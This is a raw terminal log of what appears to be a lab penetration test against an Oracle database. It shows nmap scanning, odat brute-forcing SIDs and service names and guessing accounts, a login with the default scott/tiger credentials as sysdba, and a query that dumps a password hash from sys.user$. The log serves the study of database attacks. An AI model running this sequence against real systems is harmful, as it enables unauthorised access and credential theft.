sudo snamnmap --sV 10.12.119.116.134 --open -tT4
[?2004lStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 08:58 BST
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.25 seconds
[?2004h(env) ┌─[parrot@parrot]─[~/odat]
└──╼ $└──╼ $sudo nmap -sV 10.129.116.134 --open -T4
[?2004lStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 08:59 BST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.34 seconds
[?2004h(env) ┌─[parrot@parrot]─[~/odat]
└──╼ $sudo nmap -sV 10.129.116.134 --open -T4[C[C[C[C[C[Cclearpython3 odat.py all -s 10.129.116.134[3P10.129.116.134all 10.129.116.134-s 10.129.116.134
[?2004l[+] Checking if target 10.129.116.134:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.116.134:1521 is well configured. Continue...

[1] (10.129.116.134:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.129.116.134:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.116.134:1521 server
+] SIDs found on the 10.129.116.134:1521 server: XE

[3] (10.129.116.134:1521): Searching valid Service Names
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.116.134:1521 server
+] 'XEXDB' is a valid Service Name. Continue...                
100% |#######################################################################################################################################################################| Time: 00:02:03 
[3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (10.129.116.134:1521)
[3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (10.129.116.134:1521)
[+] Service Name(s) found on the 10.129.116.134:1521 server: XE,XEXDB
[!] Notice: SID 'XE' found. Service Name 'XE' found too: Identical database instance. Removing Service Name 'XE' from Service Name list in order to don't do same checks twice

[4] (10.129.116.134:1521): Searching valid accounts on the XE SID
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[+] Accounts found on 10.129.116.134:1521/sid:XE: 
scott/tiger


[5] (10.129.116.134:1521): Searching valid accounts on the XEXDB Service Name
  0% |                                                                                                                                                                       | ETA:  --:--:-- The login abm has already been tested at least once. What do you want to do:
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
s
100% |#######################################################################################################################################################################| Time: 00:00:10 
[-] No found a valid account on 10.129.116.134:1521/XEXDB. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-files accounts/logins.txt accounts/pwds.txt'

[6] (10.129.116.134:1521): Testing all authenticated modules on sid:XE with the scott/tiger account
[6.1] UTL_HTTP library ?
[-] KO
[6.2] HTTPURITYPE library ?
09:15:34 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.UTL_HTTP", line 1819 ORA-24247: network access denied by access control list (ACL) ORA-06512: at "SYS.HTTPURITYPE", line 34`
[-] K[7] (10.129.116.134:1521): Oracle users have not the password identical to the username ?
  0% |                                                                                                                                                                       | ETA:  --:--:--   2% |####                                                                                                                                                                   | ETA:  00:00:00 [!] Notice: 'XS$NULL' account is locked, so skipping this username for password
  5% |#########                                                                                                                                                              | ETA:  00:00:09 The login XS$NULL has already been tested at least once. What do you want to do:
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
s
[-] No found a valid account on 10.129.116.134:1521/sid:XE with usernameLikePassword module
[?2004h(env) ┌─[parrot@parrot]─[~/odat]
└──╼ $sqlplus scott/tiger@10.129.116.134/XE as sysdba
[?2004l
SQL*Plus: Release 21.0.0.0.0 - Production on Sun May 19 09:16:44 2024
Version 21.12.0.0.0

Copyright (c) 1982, 2022, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> SELECT name, password FROM sys.user$ WHERE name = 'DBSNMP';

NAME			       PASSWORD
------------------------------ ------------------------------
DBSNMP			       E066D214D5421CCC

